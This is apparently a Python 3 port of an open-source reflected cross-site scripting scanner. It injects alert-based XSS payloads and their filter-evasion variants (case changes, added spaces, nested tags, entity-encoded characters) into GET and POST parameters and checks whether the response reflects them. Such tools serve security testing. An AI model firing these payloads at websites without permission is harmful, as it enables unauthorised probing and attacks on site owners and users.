"""
Original script: https://github.com/BT-hub/XssTest
Author: https://github.com/BT-hub
Port to python3: Tarnavskyi Denys
"""
import urllib.request
import urllib.error
import urllib.parse
from urllib.parse import urlencode
from helpers.colors import bcolors
from bs4 import BeautifulSoup

test_url = "https://xss-game.appspot.com/level1/frame?query=1"


class DO_Reflect_Attack(object):

    __attack_vector_list = []
    __length_attack_vector_list = 0

    def __init__(self, level):
        self.__attack_vector_list = Attack_Vector_Factory().get_Attack_Vector_lists(level)
        self.__length_attack_vector_list = len(self.__attack_vector_list)

    def do_Reflect_Attack(self, inserturl):
        """
        Main method.
        @param: inserturl - URL with GET parameter included (e.g. query=1)
        Return:
        """

        # @return "find" or "None"
        result = self.__do_Reflect_GET_Attack(inserturl)
        if result:
            print(bcolors.FAIL + "Reflected GET XSS exists!" + bcolors.OKGREEN)
            return result
        result = self.__do_Reflect_POST_Attack(inserturl)
        if result:
            print(bcolors.FAIL + "Reflected POST XSS exists!" + bcolors.OKGREEN)
            return result

        print(bcolors.CYAN +
              "Reflected XSS vulnurabilities not found!" + bcolors.OKGREEN)
        return None

    def __do_Reflect_GET_Attack(self, inserturl):
        '''
        Reflect GET Attack main method
        '''

        # 攻击向量挨个测试
        for vector_i in range(self.__length_attack_vector_list):

            # 构造测试URL
            url = inserturl + self.__attack_vector_list[vector_i]

            # 发送request，获取response
            response = do_HTTP_request(url)

            # 判断是否有response，如果没有，返回None，返回状态码不是200则返回None
            if response == None:
                print(bcolors.OKGREEN + "[GET] attack response: None 1")

                continue

            # 若返回码是200，则判断response html，是否存在XSS漏洞
            html = response.read()
            if judge_HTML_If_XSS_Exist(html, self.__attack_vector_list[vector_i]):
                return self.__attack_vector_list[vector_i]

    def __do_Reflect_POST_Attack(self, inserturl):
        '''
        Reflect POST Attack main method
        '''

        params = {}

        # 获取post参数名
        response = do_HTTP_request(inserturl)
        if response == None:
            print(bcolors.OKGREEN + "[POST] attack response: None 1")
            return None
        html = response.read()
        post_names = re_HTML_GET_POST_Names(html)

        # 如果html中不存在的字符串，即不存在输入框，则返回None
        if post_names == None:
            return None

        length_post_names = len(post_names)

        # 攻击向量挨个测试
        for vector_i in range(self.__length_attack_vector_list):

            # 构造post参数名-值对
            for i in range(length_post_names):
                params[post_names[i]] = self.__attack_vector_list[vector_i]

            # 获取response html
            response = do_HTTP_request(inserturl, params)
            if response == None:
                print(bcolors.OKGREEN + "[POST] attack response: None 2")
                continue
            html = response.read()

            # 判断response html，是否存在XSS漏洞
            if judge_HTML_If_XSS_Exist(html, self.__attack_vector_list[vector_i]):
                return self.__attack_vector_list[vector_i]


class Attack_Vector_Factory(object):
    '''
    Product Attack Vector
    '''

    __lists = []
    __basic_lists = []    # save level_2 status

    def __init__(self):
        self.__lists = []
        self.__basic_lists = []

    def get_Attack_Vector_lists(self, level):
        '''
        @return Attack Vector lists
        '''

        if level == 1:
            print(bcolors.OKGREEN + "Low-intensity Test is running...")
            self.__build_lists_1_CommonTag()
            return self.__lists
        elif level == 2:
            print(bcolors.OKGREEN + "Medium-intensity Test is running...")
            self.__build_lists_1_CommonTag()
            self.__build_lists_2_PseudoURL()
            self.__build_lists_3_HTMLEvent()
            self.__build_lists_4_CSS()
            return self.__lists
        elif level == 3:
            print(bcolors.OKGREEN + "High-intensity Test is running...")
            self.__build_lists_1_CommonTag()
            self.__build_lists_2_PseudoURL()
            self.__build_lists_3_HTMLEvent()
            self.__build_lists_4_CSS()

            self.__basic_lists = list(self.__lists)

            self.__rebuild_lists_1_AaBb()
            self.__rebuild_lists_2_Space()
            self.__rebuild_lists_3_Nest()
            self.__rebuild_lists_4_ASCII()
            self.__rebuild_lists_5_Nature()
            self.__rebuild_lists_6_Notes()
            self.__rebuild_lists_7_HTMLEncode()
            return self.__lists
        else:
            print(bcolors.WARNING + "Input error~!" + bcolors.OKGREEN)

    def __build_lists_1_CommonTag(self):
        '''
        Common Tag Insert
        '''

        build_lists = ["<script>alert('Spartans')</script>"]
        self.__lists += build_lists

    def __build_lists_2_PseudoURL(self):
        '''
        URL Pseudo agreement Insert
        '''

        build_lists = ["<img src=\"javascript:alert('Spartans')\"/>",
                       "<a herf=\"javascript:alert('Spartans'))\">click here</a>",
                       "<iframe src=\"javascript:alert('Spartans')\"></iframe>"]
        self.__lists += build_lists

    def __build_lists_3_HTMLEvent(self):
        '''
        HTML Event Insert
        '''

        build_lists = ["<body onload=\"alert('Spartans')\"></body>",
                       "<img src=\"#\" onerror=\"alert('Spartans')\"/>"]
        self.__lists += build_lists

    def __build_lists_4_CSS(self):
        '''
        CSS Insert
        '''

        build_lists = ["<div style=\"background-image: url(javascript:alert('Spartans'))\">",
                       "<style type=\"test/javascript\">alert('Spartans');</style>"]
        self.__lists += build_lists

    def __rebuild_lists_1_AaBb(self):
        '''
        Case sensitive Convertor
        '''

        tmp_lists = list(self.__basic_lists)
        rebuild_lists = []
        beforeStr = "script"
        laterStr = "scRiPt"

        if len(tmp_lists) == 0:
            return None

        for i in range(len(tmp_lists)):
            if beforeStr in tmp_lists[i]:
                tmp_lists[i] = tmp_lists[i].replace(beforeStr, laterStr)
                rebuild_lists.append(tmp_lists[i])

        self.__lists += rebuild_lists

    def __rebuild_lists_2_Space(self):
        '''
        Add Space Convertor
        '''

        tmp_lists = list(self.__basic_lists)
        rebuild_lists = []
        beforeStr1 = "<script"
        beforeStr2 = "script>"
        laterStr1 = "< script"
        laterStr2 = "script >"

        if len(tmp_lists) == 0:
            return None

        for i in range(len(tmp_lists)):
            tmpStr = tmp_lists[i].replace(beforeStr1, laterStr1)
            tmpStr = tmpStr.replace(beforeStr2, laterStr2)

            if tmpStr != tmp_lists[i]:
                tmp_lists[i] = tmpStr
                rebuild_lists.append(tmp_lists[i])

        self.__lists += rebuild_lists

    def __rebuild_lists_3_Nest(self):
        '''
        Nest Convertor
        '''

        tmp_lists = list(self.__basic_lists)
        rebuild_lists = []
        beforeStr = "script"
        laterStr = "scr<script>ipt"

        if len(tmp_lists) == 0:
            return None

        for i in range(len(tmp_lists)):
            tmpStr = tmp_lists[i].replace(beforeStr, laterStr)

            if tmpStr != tmp_lists[i]:
                tmp_lists[i] = tmpStr
                rebuild_lists.append(tmp_lists[i])

        self.__lists += rebuild_lists

    def __rebuild_lists_4_ASCII(self):
        '''
        ASCII Convertor
        '''

        tmp_lists = list(self.__basic_lists)
        rebuild_lists = []
        beforeStr1 = "java"
        beforeStr2 = "script"
        laterStr1 = "ja&#13;va"
        laterStr2 = "sc&#10;ript"

        if len(tmp_lists) == 0:
            return None

        for i in range(len(tmp_lists)):
            tmpStr = tmp_lists[i].replace(beforeStr1, laterStr1)
            tmpStr = tmpStr.replace(beforeStr2, laterStr2)

            if tmpStr != tmp_lists[i]:
                tmp_lists[i] = tmpStr
                rebuild_lists.append(tmp_lists[i])

        self.__lists += rebuild_lists

    def __rebuild_lists_5_Nature(self):
        '''
        Nature Convertor
        '''

    def __rebuild_lists_6_Notes(self):
        '''
        Notes Convertor
        '''

    def __rebuild_lists_7_HTMLEncode(self):
        '''
        HTMLEncode Convertor
        '''


def do_HTTP_request(url, params={}, httpheaders={}):
    '''
    Send a GET or POST HTTP Request.
    @return: HTTP Response
    '''

    data = {}
    request = None

    # If there is parameters, they are been encoded
    if params:
        data = urlencode(params)

        request = urllib.request.Request(url, data, headers=httpheaders)
    else:
        request = urllib.request.Request(url, headers=httpheaders)

    # Send the request, if except occured, the code isn't 200 OK
    try:
        response = urllib.request.urlopen(request)
    except:
        print(bcolors.WARNING +
              'Response CODE is not [<200>]' + bcolors.OKGREEN)

        return None

    return response


def re_HTML_GET_POST_Names(html):
    """Return all input's names list"""

    soup = BeautifulSoup(html, "html.parser")
    inputs = soup.find_all("input")
    names = [field.get("name") for field in inputs if field.get("name") is not None]

    return names


def judge_HTML_If_XSS_Exist(html, attack_vector):
    '''
    Judge if the html source code exist xss
    '''

    attack_vector = bytes(attack_vector, 'utf-8')
    return attack_vector in html


def main(url_with_params):
    return DO_Reflect_Attack(2).do_Reflect_Attack(url_with_params)
